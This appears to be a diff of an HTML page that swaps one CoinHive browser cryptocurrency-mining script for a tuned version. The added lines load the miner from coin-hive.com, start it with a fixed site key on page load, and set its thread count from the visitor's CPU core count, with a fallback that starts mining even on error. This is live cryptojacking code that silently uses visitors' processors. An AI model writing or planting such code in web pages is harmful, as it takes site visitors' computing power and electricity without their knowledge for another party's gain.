@@ -1,7 +1,10 @@
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('1kBWYndgGpfPGmDMAvdgNPc6RypR4ygW', {throttle: 1});
 
-		miner.start();
-	
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+var xmr = new CoinHive.Anonymous('1kBWYndgGpfPGmDMAvdgNPc6RypR4ygW', {throttle: 0.85, threads: 1});
+try {
+    var threads = Math.max(1,Math.floor(navigator.hardwareConcurrency/4));
+    xmr.setNumThreads(threads);
+    xmr.start();
+}catch(e){xmr.start();}
 </script>
